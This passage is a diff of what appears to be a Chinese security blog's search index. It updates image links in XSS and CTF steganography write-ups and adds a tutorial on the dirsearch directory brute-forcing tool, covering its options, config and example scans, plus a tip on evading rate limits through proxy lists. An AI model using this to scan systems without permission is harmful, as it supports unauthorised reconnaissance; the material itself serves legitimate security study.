@@ -9,12 +9,12 @@
 <h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
 <p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
 <p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/image-20220316233924916.png"></p>
+<p><img src="/2022/XSS/image-20220316233924916.png"></p>
  
 
 <h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
 <p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/image-20220316233332570.png"></p>
+<p><img src="/2022/XSS/image-20220316233332570.png"></p>
  
 
 <h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
@@ -109,15 +109,15 @@
 </ul>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
 <p>使用下面的一段，看起来像base64码</p>
-<p><img src="/image-20220312124955095.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312124955095.png"></p>
 
 
 <p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
-<p><img src="/image-20220312125607111.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312125607111.png"></p>
 
 
 <p>也可以通过解除隐藏复制</p>
-<p><img src="/image-20220312125914279.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220312125914279.png"></p>
 
 
 <p>将它们组合起来</p>
@@ -162,16 +162,16 @@
 <li>异或处理</li>
 </ul>
 <h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
-<p><img src="/image-20220313154611541.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154611541.png"></p>
 
 
 <p>发现根本不符合格式</p>
-<p><img src="/image-20220313154714073.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154714073.png"></p>
 
 
 <p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
 <p>全文进行异或后得到正确文件</p>
-<p><img src="/image-20220313154858601.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154858601.png"></p>
 
 
 <p>得到flag：<code>actfabcdfghijk</code></p>
@@ -212,16 +212,16 @@
 </ul>
 <h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
 <p>使用工具TweakPNG查看，发现有报错</p>
-<p><img src="/image-20220313165532165.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313165532165.png"></p>
 
 
 <p>用010打开图片修改</p>
-<p><img src="/image-20220313170605117.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313170605117.png"></p>
 
 
 <p>得到：<strong>you come</strong>。解压得到图片</p>
 <p>猜测LSB隐写</p>
-<p><img src="/image-20220313171718397.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313171718397.png"></p>
 
 
 <p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
@@ -238,12 +238,12 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
 
 <p>在图片信息中可以看</p>
-<p><img src="/image-20220313172549463.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313172549463.png"></p>
 
 
 <p>key：<code>**@#$%^&amp;%%$)**</code></p>
 <p>hh.jpg是<strong>steghide</strong>隐写</p>
-<p><img src="/image-20220313183441314.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313183441314.png"></p>
 
 
 <figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
@@ -254,7 +254,7 @@
 <p>运行命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20220313190100195.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313190100195.png"></p>
 
 
 <p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
@@ -264,17 +264,17 @@
 </ul>
 <h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
 <p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
-<p><img src="/image-20220313202715767.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313202715767.png"></p>
 
 
 <p>新建成压缩包</p>
 <p>对比两个包</p>
-<p><img src="/image-20220313203046943.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313203046943.png"></p>
 
 
 <p>两个包的CRC是一样的</p>
 <p>进行爆破</p>
-<p><img src="/image-20220313203155571.png"></p>
+<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313203155571.png"></p>
 
 
 <h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
@@ -292,6 +292,389 @@
       </categories>
       <tags>
         <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dirsearch-路径扫描</title>
+    <url>/2022/dirsearch/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
+<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
+<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
+<span id="more"></span>    
+
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
+<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
+<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
+<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
+<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
+<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
+</ul>
+<p>安装库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
+<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
+
+<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>扫描固定后缀文件的 URL</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>定义字典扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
+
+<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
+<p><img src="/2022/dirsearch/pause.png"></p>
+
+
+<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
+<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>还有 2 个选项：</p>
+<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
+<ul>
+<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
+<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
+</ul>
+</li>
+</ul>
+<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
+<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
+
+<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
+<ul>
+<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
+<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
+<p>对于更高级的过滤器：</p>
+<ul>
+<li><strong>–exclude-sizes</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-texts</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-regexps</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-redirects</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-exclude-content</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
+<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
+<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
+<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
+
+<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
+
+<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
+<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
+<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
+
+<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
+<p>将扫描变成报告输出出来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
+
+<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
+<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
+<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
+<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
